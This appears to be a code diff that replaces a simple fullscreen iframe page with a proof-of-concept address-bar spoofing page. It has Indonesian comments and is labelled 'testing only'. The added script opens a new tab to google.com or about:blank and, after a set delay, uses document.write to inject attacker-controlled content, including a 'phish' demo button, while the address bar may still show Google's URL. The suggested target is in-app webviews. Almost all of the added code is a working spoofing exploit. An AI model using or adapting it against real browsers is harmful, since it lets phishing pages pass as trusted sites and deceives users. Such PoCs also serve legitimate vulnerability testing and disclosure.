@@ -3,35 +3,112 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Embed Fullscreen</title>
+  <title>PoC — Address Bar Spoof (testing only)</title>
   <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      background: #000;
-      overflow: hidden;
-    }
-    iframe {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      border: none;
-    }
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:24px;background:#f6f8fb;color:#111}
+    .card{max-width:820px;margin:0 auto;padding:18px;border-radius:10px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
+    h1{font-size:20px;margin:0 0 8px}
+    p{margin:6px 0 12px}
+    .controls{display:flex;gap:8px;flex-wrap:wrap}
+    input[type=number]{width:100px;padding:6px;border-radius:6px;border:1px solid #ddd}
+    button{padding:8px 12px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
+    button.warn{background:#ff6b6b}
+    small{color:#666}
   </style>
 </head>
 <body>
-  <iframe id="theFrame" src="https://apkpure.net/" title="Embedded target"></iframe>
+  <div class="card">
+    <h1>PoC — Address Bar Spoof (for testing only)</h1>
+    <p>Teknik: buka tab baru yang diarahkan ke <code>https://www.google.com/</code>, lalu injeksikan konten ke dokumen target sebelum navigasi cross-origin selesai.</p>
 
-  <script>
-    // --- optional: auto fullscreen when user clicks anywhere
-    document.addEventListener('click', () => {
-      const el = document.documentElement;
-      if (el.requestFullscreen) el.requestFullscreen();
-      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-      else if (el.msRequestFullscreen) el.msRequestFullscreen();
-    }, { once: true });
-  </script>
+    <div class="controls" aria-hidden>
+      <label>
+        Delay (ms) sebelum injeksi:
+        <input id="delay" type="number" value="50" min="0" step="10">
+      </label>
+
+      <button id="openSpoof">Trigger Spoof</button>
+      <button id="openAbout" class="warn">Open about:blank variant</button>
+    </div>
+
+    <p><small>Catatan: Jika browser memiliki proteksi modern, kamu akan melihat exception di console (Blocked by browser protections). Uji di in-app browser yang kamu kontrol (mis. Facebook iOS WebView yang kamu uji).</small></p>
+  </div>
+
+<script>
+  function trySpoof(targetUrl, delayMs) {
+    // buka tab baru yang menavigasi ke targetUrl
+    // jika targetUrl adalah about:blank, navigasi ke google dilakukan setelah injeksi
+    let win;
+    try {
+      win = window.open(targetUrl, "_blank");
+    } catch (e) {
+      console.warn("window.open blocked:", e);
+      alert("window.open blocked oleh environment.");
+      return;
+    }
+
+    // safety: cek objek window
+    if (!win) {
+      alert("Gagal membuka window baru (popup blocked). Pastikan popup diizinkan.");
+      return;
+    }
+
+    // setelah delay, coba tulis konten attacker ke dokumen window
+    setTimeout(() => {
+      try {
+        // NOTE: ini akan melempar jika navigasi sudah cross-origin protected
+        win.document.open();
+        win.document.write(`
+          <meta charset="utf-8">
+          <title>Not Google — PoC</title>
+          <style>body{font-family:system-ui,Segoe UI,Roboto,Arial;background:#fff;color:#111;padding:32px}</style>
+          <h1>This is NOT Google</h1>
+          <p>This page was injected by the attacker PoC. Address bar may show <strong>${targetUrl}</strong>.</p>
+          <button id="phish" onclick="alert('Do not use for real phishing')">Demo button</button>
+        `);
+        win.document.close();
+        console.log("Injection attempted (document.write).");
+      } catch (err) {
+        console.warn("Blocked by browser protections:", err);
+        // tampilkan pesan singkat untuk debugging
+        try {
+          win.document.open();
+          win.document.write("<p style='font-family:system-ui;color:#900'>Blocked by browser protections: " + (err && err.message) + "</p>");
+          win.document.close();
+        } catch(e){/* ignore */}
+      }
+    }, delayMs);
+  }
+
+  document.getElementById('openSpoof').addEventListener('click', () => {
+    const delay = Math.max(0, parseInt(document.getElementById('delay').value || "50", 10));
+    // variant yang membuka target langsung (mirip PoC yang kamu jelaskan)
+    trySpoof("https://www.google.com/", delay);
+  });
+
+  document.getElementById('openAbout').addEventListener('click', () => {
+    // alternate flow: buka about:blank lalu setelah injeksi navigasi ke google
+    const delay = Math.max(0, parseInt(document.getElementById('delay').value || "50", 10));
+    let win = window.open("about:blank", "_blank");
+    if (!win) { alert("Popup blocked"); return; }
+
+    setTimeout(() => {
+      try {
+        win.document.open();
+        win.document.write(`
+          <meta charset="utf-8">
+          <title>Injected then redirect</title>
+          <h1>Injected content (about:blank)</h1>
+          <p>Now will navigate to google after short timeout.</p>
+        `);
+        win.document.close();
+        // lalu navigasi ke google (serupa transisi yang dapat 'stuck' di beberapa webviews)
+        win.location.href = "https://www.google.com/";
+      } catch (err) {
+        console.warn("Blocked during about:blank flow:", err);
+      }
+    }, delay);
+  });
+</script>
 </body>
 </html>
